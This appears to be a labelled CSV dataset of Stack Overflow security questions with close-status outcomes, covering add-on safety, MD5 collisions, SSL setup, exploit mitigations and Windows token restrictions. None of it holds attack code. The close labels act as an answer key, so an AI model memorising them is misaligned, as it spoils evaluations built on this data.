PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
10989905,06/12/2012 02:35:17,489564,10/28/2010 01:35:03,771,5,is there any security concerns with firefox addons?,"No doubt that many addons enhance firefox a lot. However, I have a general concern with installing them as I use firefox to login all kinds of my online accounts, emails, bank accounts, amazon, and so on. I would be scared if any of the addons I installed would steal my passwords or hijack my accounts. Maybe I am worried too much, but anyone know anything on this issue? Or does firefox have certain mechanisms that will prevent those from happening? (I googled a little but haven't found anything.) Thanks.",security,firefox,firefox-addon,user-accounts,,06/13/2012 07:10:06,off topic,1,90,8,"is there any security concerns with firefox addons? No doubt that many addons enhance firefox a lot. However, I have a general concern with installing them as I use firefox to login all kinds of my online accounts, emails, bank accounts, amazon, and so on. I would be scared if any of the addons I installed would steal my passwords or hijack my accounts. Maybe I am worried too much, but anyone know anything on this issue? Or does firefox have certain mechanisms that will prevent those from happening? (I googled a little but haven't found anything.) Thanks.",4
8202272,11/20/2011 14:45:09,276959,02/19/2010 12:45:43,2411,26,Should we ask users to confirm an e-mail address when they change it?,"I have a service that requires an active e-mail address where users can receive notifications. Users can optionally receive notifications on multiple e-mail addresses by adding them.

1. Should I require a new e-mail address be confirmed before I activate it?
2. Should I require an e-mail address be confirmed before changing it?

I'm looking for best practices. I'm not dealing with any sensitive or billing information.",security,confirmation,confirmation-email,,,11/21/2011 01:45:31,off topic,1,64,13,"Should we ask users to confirm an e-mail address when they change it? I have a service that requires an active e-mail address where users can receive notifications. Users can optionally receive notifications on multiple e-mail addresses by adding them.

1. Should I require a new e-mail address be confirmed before I activate it?
2. Should I require an e-mail address be confirmed before changing it?

I'm looking for best practices. I'm not dealing with any sensitive or billing information.",3
11168373,06/23/2012 09:29:03,677185,03/25/2011 17:29:05,123,15,Role of MD5 checksum in Microsft upddate,"Recently heard that Flame used [MD5 checksum collision][1] to [tamper with Microsoft update][2]. My question is where does the MD5 checksum come into play. 
From [this source][3] on Microsoft website:

1. Windows Update uses the Secure Socket Layer (SSL) protocol to send and receive information.


2. Each update is individually signed using the Secure Hashing Algorithm (SHA-1).

So where is MD5 used, is it used for authenticating the update site?


  [1]: http://en.wikipedia.org/wiki/MD5#Collision_vulnerabilities
  [2]: http://www.forbes.com/sites/richardstiennon/2012/06/14/flames-md5-collision-is-the-most-worrisome-security-discovery-of-2012/
  [3]: http://www.google.co.in/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&sqi=2&ved=0CGYQFjAA&url=http://download.microsoft.com/download/a/9/4/a94af289-a798-4143-a3f8-77004f7c2fd3/Windows%2520Update%2520Explained.docx&ei=c4nlT4G-J4OurAfTu8CKCQ&usg=AFQjCNHeRlY5qoISxRJbfBxSq-_lEtbJaw&sig2=tTExlrAiFGkZRweUT9gDPw",security,encryption,cryptography,microsoft,,,open,0,76,7,"Role of MD5 checksum in Microsft upddate Recently heard that Flame used [MD5 checksum collision][1] to [tamper with Microsoft update][2]. My question is where does the MD5 checksum come into play. 
From [this source][3] on Microsoft website:

1. Windows Update uses the Secure Socket Layer (SSL) protocol to send and receive information.


2. Each update is individually signed using the Secure Hashing Algorithm (SHA-1).

So where is MD5 used, is it used for authenticating the update site?


  [1]: http://en.wikipedia.org/wiki/MD5#Collision_vulnerabilities
  [2]: http://www.forbes.com/sites/richardstiennon/2012/06/14/flames-md5-collision-is-the-most-worrisome-security-discovery-of-2012/
  [3]: http://www.google.co.in/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&sqi=2&ved=0CGYQFjAA&url=http://download.microsoft.com/download/a/9/4/a94af289-a798-4143-a3f8-77004f7c2fd3/Windows%2520Update%2520Explained.docx&ei=c4nlT4G-J4OurAfTu8CKCQ&usg=AFQjCNHeRlY5qoISxRJbfBxSq-_lEtbJaw&sig2=tTExlrAiFGkZRweUT9gDPw",4
7061129,08/15/2011 02:12:38,775335,05/29/2011 17:29:23,38,0,Encrypt chats stored in Mongo from a Node/Websockets Chat App,"I have a simple chat app running internally in my office using Node/Socket.io/MongoDB. 

Now, I would like to figure out the most effective way to encrypt the chats in the MongoDB for security/privacy purposes.

What would be the most effective and efficient way to do this?

Thank you.",security,encryption,mongodb,node.js,socket.io,,open,0,46,10,"Encrypt chats stored in Mongo from a Node/Websockets Chat App I have a simple chat app running internally in my office using Node/Socket.io/MongoDB. 

Now, I would like to figure out the most effective way to encrypt the chats in the MongoDB for security/privacy purposes.

What would be the most effective and efficient way to do this?

Thank you.",5
9253067,02/12/2012 21:53:22,157614,08/17/2009 08:35:26,111,1,Code security - how to protect aginst malevolent programmers,"How to protecting you application from outside world is widely debated across the internet and also in Stack Overflow.

But danger may also come from you development team. When small/medium company recruits evil programmer then its in heap of trouble.

I think that is highly unlikely for average web development company (or any small company that deals with non ""critical"" stuff) to actually hire someone hell bent on harming them.

This changes with banks, medical/biotech companies, military contractors and also in other fields.

Lets say that agent is already in and is tasked with building backdoor directly into bank application that bypass role hierarchy or whatever.

I guess this is real problem that (especially) financial institutions must deal with on daily basis.

What does they do to solve this problem?

Links to articles/literature will be highly appreciated.",security,,,,,02/14/2012 20:55:28,off topic,1,130,9,"Code security - how to protect aginst malevolent programmers How to protecting you application from outside world is widely debated across the internet and also in Stack Overflow.

But danger may also come from you development team. When small/medium company recruits evil programmer then its in heap of trouble.

I think that is highly unlikely for average web development company (or any small company that deals with non ""critical"" stuff) to actually hire someone hell bent on harming them.

This changes with banks, medical/biotech companies, military contractors and also in other fields.

Lets say that agent is already in and is tasked with building backdoor directly into bank application that bypass role hierarchy or whatever.

I guess this is real problem that (especially) financial institutions must deal with on daily basis.

What does they do to solve this problem?

Links to articles/literature will be highly appreciated.",1
10328279,04/26/2012 06:28:21,1103966,12/17/2011 22:40:47,371,5,Are the old days of code injection over?,"I was wondering since all updated operating systems guard against stack and heap type overflows via ASLR, Canary Checks, and other such methods, are memory corruption exploits still prevalent? Given that the administrator of the system is competent and protects the system from brute force or libc attacks, I honestly can't see many other ways. They only thing that I can possibly imagine for someone to attack a system is to overwrite function pointers on the stack but thats about it. Maybe if someone found a clever way of predicting random numbers, the schemes that rely on random results could be defeated, however it seems unlikely. It seems the only way to exploit someone else's system given now a days is to trick root or the admin into installing your software. Are the old days of code injection over? I'm at this from the perspective of breaking updated protected systems.  ",security,stackoverflow,buffer-overflow,code-injection,shellcode,04/30/2012 04:37:15,not constructive,1,152,8,"Are the old days of code injection over? I was wondering since all updated operating systems guard against stack and heap type overflows via ASLR, Canary Checks, and other such methods, are memory corruption exploits still prevalent? Given that the administrator of the system is competent and protects the system from brute force or libc attacks, I honestly can't see many other ways. They only thing that I can possibly imagine for someone to attack a system is to overwrite function pointers on the stack but thats about it. Maybe if someone found a clever way of predicting random numbers, the schemes that rely on random results could be defeated, however it seems unlikely. It seems the only way to exploit someone else's system given now a days is to trick root or the admin into installing your software. Are the old days of code injection over? I'm at this from the perspective of breaking updated protected systems.  ",5
9628187,03/09/2012 02:34:03,1258393,03/09/2012 02:29:03,1,0,Security error - Web tab in Salesforce,"In SalesForce, I added a web tab that pointed to an internal site of ours. I get an error 

>  401 - Unauthorized: Access is denied due to invalid credentials. You
> do not have permission to view this directory or page using the
> credentials that you supplied.

when trying to access the web tab. The internal site is authenticated by active directory accounts. It works fine outside of sales force. Is there anything I could do in salesforce to make the webtab work seamslessly. Thanks in advance for any insightful tips.",security,active-directory,salesforce,,,03/09/2012 12:41:06,off topic,1,91,7,"Security error - Web tab in Salesforce In SalesForce, I added a web tab that pointed to an internal site of ours. I get an error 

>  401 - Unauthorized: Access is denied due to invalid credentials. You
> do not have permission to view this directory or page using the
> credentials that you supplied.

when trying to access the web tab. The internal site is authenticated by active directory accounts. It works fine outside of sales force. Is there anything I could do in salesforce to make the webtab work seamslessly. Thanks in advance for any insightful tips.",3
533965,02/10/2009 20:10:07,6681,09/15/2008 12:29:11,634,21,Why is security through obscurity a bad idea?,"I recently came across a system where all of the DB connections were managed by routines obscured in various ways, including base 64 encoding, md5sums and various other techniques.

Is it just me, or is this overkill? What's the alternatives?",security,,,,,04/05/2012 14:04:10,off topic,1,39,8,"Why is security through obscurity a bad idea? I recently came across a system where all of the DB connections were managed by routines obscured in various ways, including base 64 encoding, md5sums and various other techniques.

Is it just me, or is this overkill? What's the alternatives?",1
8481174,12/12/2011 21:34:08,1086967,12/08/2011 03:50:12,3,0,Is my Bitbucket password visible over the wire when I push from Mercurial using a public WiFi?,"Often when I'm at Starbucks I open the Windows command prompt and push some changes to Bitbucket like this:

    C:\My Projects\wiggywozzle>hg push https://wiggywozzle:my_wiggywozzle_password@bitbucket.org/wiggywozzle/wiggywozzle/
    pushing to https://wiggywozzle:***@bitbucket.org/wiggywozzle/wiggywozzle/
    searching for changes
    no changes found

The first line is what I type:

    C:\My Projects\wiggywozzle>hg push https://wiggywozzle:my_wiggywozzle_password@bitbucket.org/wiggywozzle/wiggywozzle/

But the message from Mercurial hides the typed password:

    pushing to https://wiggywozzle:***@bitbucket.org/wiggywozzle/wiggywozzle/

Does that mean it is encrypted before it goes out over the Starbucks WiFi connection and is therefore safe from public consumption?",security,encryption,windows-7,mercurial,https,12/13/2011 04:05:54,off topic,1,92,17,"Is my Bitbucket password visible over the wire when I push from Mercurial using a public WiFi? Often when I'm at Starbucks I open the Windows command prompt and push some changes to Bitbucket like this:

    C:\My Projects\wiggywozzle>hg push https://wiggywozzle:my_wiggywozzle_password@bitbucket.org/wiggywozzle/wiggywozzle/
    pushing to https://wiggywozzle:***@bitbucket.org/wiggywozzle/wiggywozzle/
    searching for changes
    no changes found

The first line is what I type:

    C:\My Projects\wiggywozzle>hg push https://wiggywozzle:my_wiggywozzle_password@bitbucket.org/wiggywozzle/wiggywozzle/

But the message from Mercurial hides the typed password:

    pushing to https://wiggywozzle:***@bitbucket.org/wiggywozzle/wiggywozzle/

Does that mean it is encrypted before it goes out over the Starbucks WiFi connection and is therefore safe from public consumption?",5
8394355,12/06/2011 01:47:15,525951,12/01/2010 01:21:11,8,0,Suspending Accounts after Inactivity,"I'm building a system that will automatically suspend accounts after x number of days of inactivity and will then delete these accounts after y number of days of inactivity.

Is anyone aware of any guidelines that should be followed when setting the x and y values?

Thanks",security,account,,,,12/07/2011 01:55:47,not a real question,1,45,4,"Suspending Accounts after Inactivity I'm building a system that will automatically suspend accounts after x number of days of inactivity and will then delete these accounts after y number of days of inactivity.

Is anyone aware of any guidelines that should be followed when setting the x and y values?

Thanks",2
8993353,01/24/2012 20:07:20,1127635,01/03/2012 10:38:19,18,0,The IP 210.42.74.40 went on my local website. Virus alert?,"The IP 210.42.74.40 seems to have been on my local CodeIgniter installation. It appears in the  sessions table of my MySql DB.
I am using Nginx 1.0.5, on Ubuntu 11.10 up to date with the latest patches.
The IP seems located in China apparently.

Does that mean I have a virus ? Should I completely wipe my hard drives and reinstall Linux ?

I have a bunch of important passwords stored my HDD, including SSH passphrases, etc. What are your suggestions ?

If this is due to a possible malware, what firewall / antivirus would you suggest ?",security,nginx,firewall,virus,,01/24/2012 20:42:01,off topic,1,94,10,"The IP 210.42.74.40 went on my local website. Virus alert? The IP 210.42.74.40 seems to have been on my local CodeIgniter installation. It appears in the  sessions table of my MySql DB.
I am using Nginx 1.0.5, on Ubuntu 11.10 up to date with the latest patches.
The IP seems located in China apparently.

Does that mean I have a virus ? Should I completely wipe my hard drives and reinstall Linux ?

I have a bunch of important passwords stored my HDD, including SSH passphrases, etc. What are your suggestions ?

If this is due to a possible malware, what firewall / antivirus would you suggest ?",4
3515569,08/18/2010 18:47:59,424389,08/18/2010 18:22:06,1,0,Weblogic Subject propagation - Where is subject stored? ,"Need to understand how subject is stored and propagated in weblogic.

Once authenticated, where is subject stored in HTTP layer ?
Internally is it stored in HTTPSession ?

Same way, where is it stored in EJB layer ?

Have an application, where a lot of principals are updated in the subject in HTTP & EJB layer. At some corner cases, getting Concurrent Modification Exception. Although the fix is simple, just to synchronize, Need to understand the internals of where the subject is stored at HTTP & EJB layer.

Forget answering, Is the question clear ? Just want to confirm.

thanks
",security,java-ee,weblogic,propagation,subject,,open,0,94,9,"Weblogic Subject propagation - Where is subject stored?  Need to understand how subject is stored and propagated in weblogic.

Once authenticated, where is subject stored in HTTP layer ?
Internally is it stored in HTTPSession ?

Same way, where is it stored in EJB layer ?

Have an application, where a lot of principals are updated in the subject in HTTP & EJB layer. At some corner cases, getting Concurrent Modification Exception. Although the fix is simple, just to synchronize, Need to understand the internals of where the subject is stored at HTTP & EJB layer.

Forget answering, Is the question clear ? Just want to confirm.

thanks
",5
7466225,09/19/2011 03:42:54,363441,06/10/2010 12:39:05,370,6,How does SSH encrypt data?,"Say Alice and Bob have succeeded in connecting securely to one another via. SSH. Now every time Alice sends some data to Bob, it is encrypted using the RSA algorithm. Given that encrypting takes some time (i.e., selecting primes etc. for every chunk of data), how does SSH manage to do it so quickly, given that the end user notices no lag at all?",security,ssh,cryptography,rsa,,09/19/2011 06:25:18,not a real question,1,64,5,"How does SSH encrypt data? Say Alice and Bob have succeeded in connecting securely to one another via. SSH. Now every time Alice sends some data to Bob, it is encrypted using the RSA algorithm. Given that encrypting takes some time (i.e., selecting primes etc. for every chunk of data), how does SSH manage to do it so quickly, given that the end user notices no lag at all?",4
8290250,11/28/2011 00:20:10,509882,11/16/2010 18:13:15,16,1,Industrial strength cloud file storage,"I'm looking for an industrial strength cloud file storage system. It will be used by multiple people in a startup.

Our requirements:

 - Transparent file system access: files and folders in the file system must be able transparently access (read and write) files in the cloud; files must be synchronized whenever network access is available and buffered otherwise. The system must be usable by non-technical people.
 - Access control: we need to control who can access which files, at least on a very coarse basis. e.g., the developers will be able to access the system design documents, only the corporate folks can access recruiting documents, and only management can access certain corporate documents. 
Dropbox provides this via Sharing folders, but that's not adequate, if I understand it correctly, because there's no authentication of the sharing user. so the cloud service should have a notion of an account (our startup) with multiple users with distinct credentials and rights for each user
 - Clients: it must be accessible from Macs and PCs; I would hope that it supports Linux (e.g., Ubuntu) too
 - Security: it must provide robust security
 - Backup: the cloud service must reliably backup the files
 - Versioning: change version history, is a big plus, but not required
 - Not free: we're willing to pay for the service

So far, we've reviewed the following, albeit not completely thoroughly:

 - Dropbox: has all except 1) Access control, which is provided via Sharing folders, but that's not adequate, if I understand it correctly, because there's no authentication of the sharing user. and 2) Security, as discussed here <http://dereknewton.com/2011/04/dropbox-authentication-static-host-ids/>, and here <http://www.economist.com/blogs/babbage/2011/05/internet_security> and here <http://blog.dropbox.com/?p=821>.
- Windows Live Mesh, has all except 1) Clients, only supporting Windows 7 and OS X.
- SpiderOak has all, except 1) Transparent file system access, which is only available for 1 user.
- Amazon Cloud, doesn't offer 1) Transparent file system access
- Rackspace Cloud Drive has all except 1) Access control and 2) Versioning

I'll gladly include any clarifications or additional systems the community provides.

Arthur",security,filesystems,cloud,transparent,,11/28/2011 09:15:38,not constructive,1,333,5,"Industrial strength cloud file storage I'm looking for an industrial strength cloud file storage system. It will be used by multiple people in a startup.

Our requirements:

 - Transparent file system access: files and folders in the file system must be able transparently access (read and write) files in the cloud; files must be synchronized whenever network access is available and buffered otherwise. The system must be usable by non-technical people.
 - Access control: we need to control who can access which files, at least on a very coarse basis. e.g., the developers will be able to access the system design documents, only the corporate folks can access recruiting documents, and only management can access certain corporate documents. 
Dropbox provides this via Sharing folders, but that's not adequate, if I understand it correctly, because there's no authentication of the sharing user. so the cloud service should have a notion of an account (our startup) with multiple users with distinct credentials and rights for each user
 - Clients: it must be accessible from Macs and PCs; I would hope that it supports Linux (e.g., Ubuntu) too
 - Security: it must provide robust security
 - Backup: the cloud service must reliably backup the files
 - Versioning: change version history, is a big plus, but not required
 - Not free: we're willing to pay for the service

So far, we've reviewed the following, albeit not completely thoroughly:

 - Dropbox: has all except 1) Access control, which is provided via Sharing folders, but that's not adequate, if I understand it correctly, because there's no authentication of the sharing user. and 2) Security, as discussed here <http://dereknewton.com/2011/04/dropbox-authentication-static-host-ids/>, and here <http://www.economist.com/blogs/babbage/2011/05/internet_security> and here <http://blog.dropbox.com/?p=821>.
- Windows Live Mesh, has all except 1) Clients, only supporting Windows 7 and OS X.
- SpiderOak has all, except 1) Transparent file system access, which is only available for 1 user.
- Amazon Cloud, doesn't offer 1) Transparent file system access
- Rackspace Cloud Drive has all except 1) Access control and 2) Versioning

I'll gladly include any clarifications or additional systems the community provides.

Arthur",4
6441788,06/22/2011 14:41:58,12597,09/16/2008 14:53:25,11934,267,SaferCreateLevel SAFER_LEVELID_UNTRUSTED: The application was unable to start correctly (0xc0000142),"i'm trying to launch a process (*any* process) as ""**untrusted**"" using the [`SaferCreateLevel`][1] with the `SAFER_LEVELID_UNTRUSTED` safer level:

> Allows programs to execute with access only to resources granted to open well-known groups, blocking access to **Administrator** and **Power User** privileges and personally granted rights.

Using the code from Michael Howards DropMyRights MDSN article ([Browsing the Web and Reading E-mail Safely as an Administrator][2]) the pseudo-code is:

    //get a handler on a Safer level
    hSaferLevel = SaferCreateLevel(SAFER_SCOPEID_USER, SAFER_LEVELID_UNTRUSTED);

    //Create a security token out of the safer level handle
    hSecurityToken = SaferComputeTokenFromLevel(hSaferLevel);

    //Create process as user
    CreateProcessAsUser(hSecurityToken, ""myapp.exe"");

Except that the process fails to launch:

> The application was unable to start correctly (0xc0000142).   

![enter image description here][3]

What's going on here?


----------

My application **is** able to handle running as a ""low"" user.

The end goal was to run the process with the same privelages as a **MandatoryIntegrity\Low** process would get (although not tagged as low). So i tested that. 

i used `icacls` to mark [my application to run **Mandatory Integrity Level\Low**][4]:

    C:\Develop>icacls RTMS.exe /setintegritylevel Low
    processed file: RTMS.exe
    Successfully processed 1 files; Failed processing 0 files

And my application launches correctly, and is running at the low integrity level:

![enter image description here][5]

While i might be able to use the [`AddMandatoryAce`][6] API, or fiddle with the ACLs in the security token myself, i'm curious what's up with an `UNTRUSTED` Safer level - and why i can't get anything to launch.

**Note:** On Windows 7 if you mark `calc` or `notepad` as `/setintegritylevel low` they will fail to launch (no error, just never appear), even [though this MSDN article talks about using calc as a test of low integrity level][7]:

![enter image description here][8]




    
    


  [1]: http://msdn.microsoft.com/en-us/library/ms722425%28v=vs.85%29.aspx
  [2]: http://msdn.microsoft.com/en-us/library/ms972827.aspx
  [3]: http://i.stack.imgur.com/81HwV.png
  [4]: http://msdn.microsoft.com/en-us/library/bb625960.aspx
  [5]: http://i.stack.imgur.com/fR670.jpg
  [6]: http://blogs.msdn.com/b/cjacks/archive/2006/10/24/modifying-the-mandatory-integrity-level-for-a-securable-object-in-windows-vista.aspx
  [7]: http://msdn.microsoft.com/en-us/library/bb625960.aspx
  [8]: http://i.stack.imgur.com/10gkM.gif",security,winapi,uac,,,,open,0,333,10,"SaferCreateLevel SAFER_LEVELID_UNTRUSTED: The application was unable to start correctly (0xc0000142) i'm trying to launch a process (*any* process) as ""**untrusted**"" using the [`SaferCreateLevel`][1] with the `SAFER_LEVELID_UNTRUSTED` safer level:

> Allows programs to execute with access only to resources granted to open well-known groups, blocking access to **Administrator** and **Power User** privileges and personally granted rights.

Using the code from Michael Howards DropMyRights MDSN article ([Browsing the Web and Reading E-mail Safely as an Administrator][2]) the pseudo-code is:

    //get a handler on a Safer level
    hSaferLevel = SaferCreateLevel(SAFER_SCOPEID_USER, SAFER_LEVELID_UNTRUSTED);

    //Create a security token out of the safer level handle
    hSecurityToken = SaferComputeTokenFromLevel(hSaferLevel);

    //Create process as user
    CreateProcessAsUser(hSecurityToken, ""myapp.exe"");

Except that the process fails to launch:

> The application was unable to start correctly (0xc0000142).   

![enter image description here][3]

What's going on here?


----------

My application **is** able to handle running as a ""low"" user.

The end goal was to run the process with the same privelages as a **MandatoryIntegrity\Low** process would get (although not tagged as low). So i tested that. 

i used `icacls` to mark [my application to run **Mandatory Integrity Level\Low**][4]:

    C:\Develop>icacls RTMS.exe /setintegritylevel Low
    processed file: RTMS.exe
    Successfully processed 1 files; Failed processing 0 files

And my application launches correctly, and is running at the low integrity level:

![enter image description here][5]

While i might be able to use the [`AddMandatoryAce`][6] API, or fiddle with the ACLs in the security token myself, i'm curious what's up with an `UNTRUSTED` Safer level - and why i can't get anything to launch.

**Note:** On Windows 7 if you mark `calc` or `notepad` as `/setintegritylevel low` they will fail to launch (no error, just never appear), even [though this MSDN article talks about using calc as a test of low integrity level][7]:

![enter image description here][8]




    
    


  [1]: http://msdn.microsoft.com/en-us/library/ms722425%28v=vs.85%29.aspx
  [2]: http://msdn.microsoft.com/en-us/library/ms972827.aspx
  [3]: http://i.stack.imgur.com/81HwV.png
  [4]: http://msdn.microsoft.com/en-us/library/bb625960.aspx
  [5]: http://i.stack.imgur.com/fR670.jpg
  [6]: http://blogs.msdn.com/b/cjacks/archive/2006/10/24/modifying-the-mandatory-integrity-level-for-a-securable-object-in-windows-vista.aspx
  [7]: http://msdn.microsoft.com/en-us/library/bb625960.aspx
  [8]: http://i.stack.imgur.com/10gkM.gif",3
3189846,07/06/2010 20:11:52,226897,12/08/2009 05:32:39,1785,114,Can I get into trouble for identifying vulnerabilities in someone elses website?,"Is it possible to get into legal trouble for identifying vulnerabilities in a web application even if you don't exploit them?  

I use tools like NetSparker on occasion to see if a site has any vulnerabilities and I'd like to contact the owner of the site to see if they'd be interested in me fixing it.  I suspect that some of these people might get angry or misinterpret my intentions and I'm curious if I could get into any trouble for simply finding these security issues.",security,web-security,,,,07/07/2010 14:45:01,off topic,1,88,12,"Can I get into trouble for identifying vulnerabilities in someone elses website? Is it possible to get into legal trouble for identifying vulnerabilities in a web application even if you don't exploit them?  

I use tools like NetSparker on occasion to see if a site has any vulnerabilities and I'd like to contact the owner of the site to see if they'd be interested in me fixing it.  I suspect that some of these people might get angry or misinterpret my intentions and I'm curious if I could get into any trouble for simply finding these security issues.",2
9409091,02/23/2012 07:56:42,1195848,02/07/2012 22:04:57,10,1,How to get SSL to work when using a pointer URL,"This is my first time trying to impliment using an SSL certificate so I'm really not too familiar with them at all.  I am trying to get the certificate to work on an Amazon server.  I did some research and found out that in order to do this I need to create my own domain that points to the Amazon server.  The reason for this is because you are not allowed to directly impliment the certificates through an Amazon server.  

 

When applying for the SSL I used the command, **openssl req -new -newkey rsa:2048 -nodes -keyout server.key -out server.csr**, with the Amazon server replacing server.  When I get asked the questions I input the pointer domain that I bought (i.e. www.pointer.com) for the common name.  It then genereated the csr and key files that got approved by godaddy and I was issued my certificate.  

 

I then went through the few steps to install your certificate on your apache server and everything seemed to go correctly.  When I restart the server and run the validation to see if it had worked it doesn't seem to be working correctly.

 

If anyone could please help me it would be greatly appreciated.  I'm not sure if I used the correct information when generating the key or if the method of having a domain that just points to your server is the correct thing to do here.

 

Thanks

-Ryan",security,ssl,https,godaddy,,02/24/2012 17:30:24,off topic,1,244,11,"How to get SSL to work when using a pointer URL This is my first time trying to impliment using an SSL certificate so I'm really not too familiar with them at all.  I am trying to get the certificate to work on an Amazon server.  I did some research and found out that in order to do this I need to create my own domain that points to the Amazon server.  The reason for this is because you are not allowed to directly impliment the certificates through an Amazon server.  

 

When applying for the SSL I used the command, **openssl req -new -newkey rsa:2048 -nodes -keyout server.key -out server.csr**, with the Amazon server replacing server.  When I get asked the questions I input the pointer domain that I bought (i.e. www.pointer.com) for the common name.  It then genereated the csr and key files that got approved by godaddy and I was issued my certificate.  

 

I then went through the few steps to install your certificate on your apache server and everything seemed to go correctly.  When I restart the server and run the validation to see if it had worked it doesn't seem to be working correctly.

 

If anyone could please help me it would be greatly appreciated.  I'm not sure if I used the correct information when generating the key or if the method of having a domain that just points to your server is the correct thing to do here.

 

Thanks

-Ryan",4
9998548,04/03/2012 17:43:19,1291802,03/25/2012 20:57:25,4,0,Why do big websites such as government websites have two stage login process?,"Why? I'm just curious as to why a login process is done over two different pages. Is it a security concern? If so, how does a two page login process counterattack this problem? 

Thanks",security,logging,website,government,,04/03/2012 18:06:31,off topic,1,34,13,"Why do big websites such as government websites have two stage login process? Why? I'm just curious as to why a login process is done over two different pages. Is it a security concern? If so, how does a two page login process counterattack this problem? 

Thanks",4
11533444,07/18/2012 02:17:58,1533381,07/18/2012 01:54:38,1,0,Creating a Smarty variable in a template from smarty variables,"I am trying to create a hash using a salt (from a global file) and variables from the template form. I need to create the hash in the template. Perhaps i am missing something obvious, but I cannot pass $hash to the php file.  The variables bspid and sspid are passed with no problem. y code:

    <select name=""bspid"">
    {section name=all loop=$buySides}
    . . . .
    </option>
    {/section}
    </select>
    <input type=""hidden"" name=""sspid"" value=""{$smarty.get.id}"">
    { $hash=md5({$smarty.const.salt}.{$smarty.get.id}.bspid) }
    [submit button]

Any help would be greatly appreciated. Thank you.

",security,templates,hash,smarty,,,open,0,112,10,"Creating a Smarty variable in a template from smarty variables I am trying to create a hash using a salt (from a global file) and variables from the template form. I need to create the hash in the template. Perhaps i am missing something obvious, but I cannot pass $hash to the php file.  The variables bspid and sspid are passed with no problem. y code:

    <select name=""bspid"">
    {section name=all loop=$buySides}
    . . . .
    </option>
    {/section}
    </select>
    <input type=""hidden"" name=""sspid"" value=""{$smarty.get.id}"">
    { $hash=md5({$smarty.const.salt}.{$smarty.get.id}.bspid) }
    [submit button]

Any help would be greatly appreciated. Thank you.

",4
11626016,07/24/2012 07:24:31,1345376,04/20/2012 00:55:53,372,4,How does openid signature work without a shared key,"Following is my understanding - A third party app redirects to a an OP for authentication. Once the authentication is complete the OP redirects back to the third party app. 

It also sends back in query string a number of parameters and also sends back a signature. My question is how does the third party app verify the signature. As I understand it will need a shared key to do this, but I dont see that shared in the in the initial redirect to the OP?

Now assuming that a key was shared, then what is the use, as the communication can be sniffed, and the contents manipulated.

Thanks,
Murtaza",security,openid,,,,07/24/2012 11:58:14,off topic,1,107,9,"How does openid signature work without a shared key Following is my understanding - A third party app redirects to a an OP for authentication. Once the authentication is complete the OP redirects back to the third party app. 

It also sends back in query string a number of parameters and also sends back a signature. My question is how does the third party app verify the signature. As I understand it will need a shared key to do this, but I dont see that shared in the in the initial redirect to the OP?

Now assuming that a key was shared, then what is the use, as the communication can be sniffed, and the contents manipulated.

Thanks,
Murtaza",2
8035132,11/07/2011 10:23:32,727272,04/27/2011 12:43:28,49,2,What are the common pitfalls to avoid in a jsp application in terms of security?,"I am starting to work on a Fairly standard Jsp application. (Jsp,Oracle backend).

The security of the application is important. So what are the common(also uncommon ) Pitfalls that I should avoid as a novice.

Basically, Its just a few forms to get user input and some session management to display data according to user roles.

This discussion could serve as reference to future users also.

regards",security,jsp,session,,,11/07/2011 11:25:43,not constructive,1,63,15,"What are the common pitfalls to avoid in a jsp application in terms of security? I am starting to work on a Fairly standard Jsp application. (Jsp,Oracle backend).

The security of the application is important. So what are the common(also uncommon ) Pitfalls that I should avoid as a novice.

Basically, Its just a few forms to get user input and some session management to display data according to user roles.

This discussion could serve as reference to future users also.

regards",3
3638918,09/03/2010 19:25:19,336829,05/09/2010 21:31:40,40,1,How to secure ebooks?,"If I want to sell my ebook online, and want to make sure the buyer can not redistribute my ebook, how can I secure it?",security,encryption,ebook,,,09/04/2010 03:03:25,off topic,1,25,4,"How to secure ebooks? If I want to sell my ebook online, and want to make sure the buyer can not redistribute my ebook, how can I secure it?",3
